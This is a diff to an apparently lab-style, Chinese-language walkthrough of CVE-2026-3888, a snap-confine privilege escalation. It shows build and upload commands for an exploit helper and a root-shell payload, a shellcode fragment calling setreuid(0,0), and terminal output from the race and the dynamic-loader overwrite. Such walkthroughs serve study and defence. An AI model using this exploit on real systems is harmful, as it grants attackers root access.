@@ -454,6 +454,9 @@ drwxr-xr-x 21 root root  540 Apr  8 09:05 ..
 #### /proc/PID/cwd 会遵循该进程的挂载命名空间视图，从而绕过了 /tmp/snap-private-tmp/ 上 700 权限（即根用户对根目录的权限）的限制。
 #### 使用 --base snapd（无效）会删除缓存的挂载命名空间，但会保留 /tmp 目录。systemd-run 包装器满足了 snap 的 cgroup 要求。出现这个错误是意料之中的，因为失败行为正是导致命名空间被破坏的原因。
 #### 我们对本文末尾所包含的辅助程序和附加文件进行了编译和上传。该辅助程序会重新创建 .snap（由攻击者控制的文件），将 285 个真实的库复制到 .exchange 文件夹中，启动 snapconfine 并通过一个小型套接字限制调试输出，检测绑定挂载触发器，并通过 renameat2(RENAME_EXCHANGE) 原子性地交换目录。snap-confine 会恢复运行并以 root 身份绑定挂载我们的文件。我们需要保持这个终端窗口打开，以使进程保持运行状态，从而保持我们被污染的命名空间的运行状态。
+<details>
+<summary>$ vi firefox_2404.c</summary>
+
 ```
 [★]$ vi firefox_2404.c
 #define _GNU_SOURCE
@@ -661,13 +664,19 @@ int main(int argc, char *argv[]) {
 		return 0;
 }
 ```
+</details>
+
 ```
 [★]$ gcc -O2 -static -o firefox_2404 firefox_2404.c
 [★]$ file firefox_2404
 firefox_2404: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=ef5e7a78d40cb3c90c41038239ad23833412c353, for GNU/Linux 3.2.0, not stripped
 ```
+
+<details>
+<summary>$ vi payload.c</summary>
+	
 ```
-[★]$ cat librootshell.c
+[★]$ vi payload.c
 void _start(void) {
 		/* setreuid(0, 0) */
 		__asm__ volatile (
@@ -702,6 +711,8 @@ void _start(void) {
 					);
 }
 ```
+</details>
+
 ```
 [★]$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
 [★]$ mv librootshell.so payload.so
@@ -721,35 +732,24 @@ firefox_2404
 jonathan@10.129.18.95's password: 
 payload.so                                           100% 9056   935.2KB/s   00:00    
 ```
+#### 试着把错误也加进去
 ```
-jonathan@snapped:~$ ~/firefox_2404 ~/payload.so
+jonathan@snapped:/proc/4124/cwd$ ls -la 
+total 4
+drwxrwxrwt  2 root root 4096 Apr 11 03:29 .
+drwxr-xr-x 21 root root  540 Apr 11 03:25 ..
+jonathan@snapped:/proc/4124/cwd$ systemd-run --user --scope --unit=snap.d$(date +%s) /bin/bash
+Running as unit: snap.d1775892725.scope; invocation ID: 73f2318ce8d8418f8b458d18c399e08e
+jonathan@snapped:/proc/4124/cwd$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
+cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_gE21im//dev: No such file or directory
+```
+```
+jonathan@snapped:/proc/4124/cwd$ ~/firefox_2404 ~/payload.so
 [*] CVE-2026-3888 - firefox 24.04 helper
-[*] CWD: /home/jonathan
+[*] CWD: /proc/4124/cwd
 [*] Setting up .snap and .exchange directiry...
 [*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
 [+] Done. Re-enter sandbox to exploit.
-
-jonathan@snapped:~$ ls .snap/usr/lib/x86_64-linux-gnu.exchange | head
-audit
-cryptsetup
-e2fsprogs
-engines-3
-gconv
-gio
-glib-2.0
-krb5
-ld-linux-x86-64.so.2
-libacl.so.1
-
-```
-```
-jonathan@snapped:~$ cd /proc/9834/cwd
-jonathan@snapped:/proc/9834/cwd$ ls -la
-total 12
-drwxrwxrwt  4 root root 4096 Apr 10 05:48 .
-drwxr-xr-x 21 root root  540 Apr 10 05:45 ..
-drwxr-xr-x  4 root root 4096 Apr 10 05:45 .snap
-drwxrwxrwt  2 root root 4096 Apr 10 03:26 .X11-unix
 ```
 #### Step 4 — Destroy cached namespace 
 #### Step 5 — Win the race 
@@ -758,6 +758,7 @@ drwxrwxrwt  2 root root 4096 Apr 10 03:26 .X11-unix
 Terminal 3
 ----------------------------------------------------------------------
 #### Step 6 — Overwrite dynamic loader
+#### race_pid.txt 文件中包含内层 shell 的进程 ID（PID）。race_perms.txt 确认了攻击者拥有权限。/proc/$PID/root 暴露了被污染的命名空间的文件系统。busybox 被植入为 /tmp/sh（静态二进制文件，无 ld-linux 依赖），并且 ld-linux-x86-64.so.2 被我们的 shellcode 覆盖。
 #### Step 7 — Trigger root 
 ----------------------------------------------------------------------
 Busybox shell
